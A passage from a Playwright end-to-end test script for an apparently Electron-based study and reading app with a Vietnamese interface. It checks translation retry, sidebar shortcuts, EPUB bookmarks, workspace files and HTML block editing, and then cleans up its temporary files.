  await page.mouse.move(para2.x + 1, para2.y + para2.height / 2)
  await page.mouse.down()
  await page.mouse.move(para2.x + para2.width - 2, para2.y + para2.height / 2, { steps: 6 })
  await page.mouse.up()
  await page.click('.hl-translate-btn')
  await page.waitForSelector('.translate-head .translate-failed')
  check((await page.textContent('.translate-head .translate-failed')) === 'Không dịch được', 'a refused translation says so (not "Đang dịch…")')
  await page.click('.translate-actions >> text=Thử lại')
  await page.waitForFunction(() => document.querySelector('.translate-text')?.textContent === '[vi] The lecture starts at nine.')
  check(true, '"Thử lại" translates it')
  await page.keyboard.press('Escape')
  // In an HTML page (its own frame), a click back in the page closes the translation.
  writeFileSync(file('Dịch trang.html'), '<!doctype html><html><head><meta charset="utf-8"><title>Dịch trang</title></head><body><h1>Dịch trang</h1><p>Caching keeps hot data close.</p><p>Second paragraph here.</p></body></html>')
  await page.waitForSelector('.doc-list .row.doc >> text=Dịch trang', { timeout: 10000 })
  await openDoc('Dịch trang')
  await page.frameLocator('iframe.html-frame').locator('h1').waitFor()
  await page.waitForTimeout(500)
  const translateFrame = () => page.frames().find((fr) => fr.url().startsWith('doc://') && fr.url().includes('D%E1%BB%8Bch%20trang.html'))
  await selectText(translateFrame(), 'p', 'hot data')
  await page.click('.hl-translate-btn')
  await page.waitForSelector('.translate-popover')
  await page.frameLocator('iframe.html-frame').locator('p >> text=Second paragraph').click()
  await page.waitForSelector('.translate-popover', { state: 'detached', timeout: 3000 })
  check(true, 'a click in the HTML page closes the translation')

  step('44. The sidebar hides (its button, Ctrl+\\) and comes back; Ctrl+K shows it for searching')
  await page.click('.sidebar-head .icon-btn[aria-label="Ẩn thanh bên"]')
  await page.waitForSelector('.side-rail')
  check(!(await page.isVisible('.sidebar')) && (await page.evaluate(() => localStorage.getItem('sidebar-hidden'))) === 'true', 'the sidebar hides, a thin bar stays; remembered')
  await realKey('\\', ['control'])
  await page.waitForSelector('.sidebar', { state: 'visible' })
  check((await page.locator('.side-rail').count()) === 0, 'Ctrl+\\ brings it back')
  await realKey('\\', ['control'])
  await page.waitForSelector('.side-rail')
  await realKey('K', ['control'])
  await page.waitForSelector('.sidebar', { state: 'visible' })
  check(await page.evaluate(() => document.activeElement?.closest('.search') !== null), 'Ctrl+K shows the sidebar and puts the cursor in search')
  await page.keyboard.press('Escape')

  step('45. Books: Ctrl+D bookmarks the page; the list in the side panel goes back to it')
  await page.fill('.search input', '')
  await openDoc('Sách một file')
  await page.waitForSelector('.epub-host iframe')
  await page.waitForTimeout(1500)
  await page.locator('.epub-bar .icon-btn').last().click()
  await page.waitForTimeout(600)
  await page.keyboard.press('Control+d')
  await page.waitForSelector('.epub-ribbon')
  const bookId = await page.evaluate(async () => (await window.api.getLibrary()).docs.find((d) => d.rel === 'sach/Sách một file.epub').path)
  const marks = await page.evaluate((id) => window.api.bookmarks(id), bookId)
  check(marks.length === 1 && marks[0].cfi.startsWith('epubcfi(') && (await page.getAttribute('.epub-bookmark-btn', 'aria-pressed')) === 'true', 'Ctrl+D bookmarks the page (ribbon shown, kept with the book)')
  if ((await page.locator('.outline').count()) === 0) await page.click('.doc-controls >> text=Mục lục')
  await page.click('.panel-tabs >> text=Ghi chú')
  await page.waitForSelector('.bookmark-item')
  await page.locator('.epub-bar .icon-btn').last().click()
  await page.locator('.epub-bar .icon-btn').last().click()
  await page.waitForTimeout(700)
  const awayRibbon = await page.locator('.epub-ribbon').count()
  await page.click('.bookmark-item .bookmark-go')
  await page.waitForSelector('.epub-ribbon')
  check(awayRibbon === 0, 'other pages have no ribbon; the list goes back to the bookmark')
  await page.click('.bookmark-item .bookmark-remove')
  await page.waitForSelector('.bookmark-item', { state: 'detached' })
  check((await page.evaluate((id) => window.api.bookmarks(id), bookId)).length === 0 && (await page.locator('.epub-ribbon').count()) === 0, '× in the list removes it')

  step('46. Workspace files: name the workspace, save it as a .studyws file, open another, come back with its tabs')
  await page.click('.library-name')
  await page.click('.workspace-name-btn')
  await page.fill('.workspace-current input', 'Ôn thi cuối kỳ')
  await page.keyboard.press('Enter')
  await page.waitForFunction(() => document.querySelector('.library-name-text')?.textContent === 'Ôn thi cuối kỳ')
  await page.keyboard.press('Escape')
  check(true, 'the workspace can be named')
  const tabsBefore = await page.locator('.doc-tab').count()
  const wsMain = path.join(workDir, 'Ôn thi cuối kỳ.studyws')
  await page.evaluate((f) => window.api.saveWorkspaceAs(f), wsMain)
  const wsJson = JSON.parse(readFileSync(wsMain, 'utf8'))
  check(wsJson.name === 'Ôn thi cuối kỳ' && wsJson.folders[0] === 'library' && wsJson.folders.every((f) => !path.isAbsolute(f)) && !JSON.stringify(wsJson).includes('"items"'), `the file has the name and the folders (relative), no notes (${JSON.stringify(wsJson)})`)
  check((await page.locator('.doc-tab').count()) === tabsBefore, 'saving as a file keeps the open tabs')
  const wsOther = path.join(workDir, 'Chỉ notes.studyws')
  writeFileSync(wsOther, JSON.stringify({ version: 1, name: 'Chỉ notes', folders: ['notes'], files: [] }))
  await page.evaluate((f) => window.api.openWorkspace(f), wsOther)
  await page.waitForFunction(() => document.querySelector('.library-name-text')?.textContent === 'Chỉ notes')
  await page.waitForFunction(() => !document.querySelector('.doc-list')?.textContent.includes('Lộ trình Backend'))
  check((await page.locator('.doc-tab').count()) === 0, 'another workspace file: only its folders, its own (no) tabs')
  const k8s = await page.evaluate(async () => {
    const lib = await window.api.getLibrary()
    const id = lib.docs.find((d) => d.rel === 'devops/Kubernetes.md')?.path
    return id ? lib.meta[id]?.tags ?? [] : null
  })
  check(JSON.stringify(k8s) === '["k8s"]', 'a folder keeps its tags in every workspace it is in')
  await page.evaluate((f) => window.api.openWorkspace(f), wsMain)
  await page.waitForSelector('.doc-list .row.doc >> text=Lộ trình Backend')
  await page.waitForFunction((n) => document.querySelectorAll('.doc-tab').length === n, tabsBefore)
  check(true, 'back in the first workspace, its tabs come back')

  step('47. HTML: a saved paragraph becomes a heading or a quote; a divider; blank lines between paragraphs are kept')
  writeFileSync(file('Kiểu đoạn.html'), '<!doctype html>\n<html>\n<head><meta charset="utf-8"><title>Kiểu đoạn</title></head>\n<body>\n<p>Tóm tắt</p>\n<p class="x">Nội dung thụt vào.</p>\n<p>Cuối</p>\n</body>\n</html>\n')
  await page.waitForSelector('.doc-list .row.doc >> text=Kiểu đoạn', { timeout: 10000 })
  await openDoc('Kiểu đoạn')
  await docPathIs('Kiểu đoạn.html')
  await page.click('.doc-controls >> text=Sửa chữ')
  const kindFrame = await editPage()
  await kindFrame.click('p[data-sd-block] >> text=Tóm tắt')
  await page.waitForTimeout(100)
  await page.selectOption('.html-format .block-type', 'h2')
  await kindFrame.waitForSelector('h2[data-sd-block] >> text=Tóm tắt')
  await kindFrame.click('p[data-sd-block] >> text=Nội dung thụt vào')
  await page.waitForTimeout(100)
  await page.selectOption('.html-format .block-type', 'blockquote')
  await kindFrame.waitForSelector('blockquote[data-sd-block]')
  await page.click('.html-format >> text=Đường kẻ')
  await kindFrame.waitForSelector('hr[data-sd-new]')
  await kindFrame.waitForFunction(() => document.hasFocus())
  await page.waitForTimeout(100)
  await page.keyboard.press('Enter') // a blank line after the divider...
  await page.keyboard.type('Sau dòng trống') // ...then text
  await page.keyboard.press('Enter') // a blank line before "Cuối" (kept: text follows)
  await page.waitForTimeout(200)
  await page.click('.edit-bar >> text=Lưu (Ctrl+S)')
  await editBarGone()
  const kinds = read('Kiểu đoạn.html').split('<body>')[1].split('</body>')[0]
  check(
    kinds === '\n<h2>Tóm tắt</h2>\n<blockquote class="x">Nội dung thụt vào.</blockquote>\n<hr>\n<p><br></p>\n<p>Sau dòng trống</p>\n<p><br></p>\n<p>Cuối</p>\n',
    `saved blocks change kind (only the tag), a divider, blank lines kept (${JSON.stringify(kinds)})`
  )

  check(errors.length === 0, `no console errors${errors.length ? ': ' + errors.join(' | ') : ''}`)
} catch (err) {
  console.error(err)
  if (errors.length) console.error(['--- console errors ---', ...errors].join('\n'))
  await page.screenshot({ path: shot('error') }).catch(() => {})
  const lastLines = mainLog.split(/\r?\n/).slice(-25).join('\n')
  console.error(`--- main process log (last lines) ---\n${lastLines}`)
  failures++
} finally {
  await app.close()
  web.close()
  rmSync(workDir, { recursive: true, force: true })
}

console.log(failures ? `\n${failures} check(s) failed` : '\nAll checks passed')
process.exit(failures ? 1 : 0)
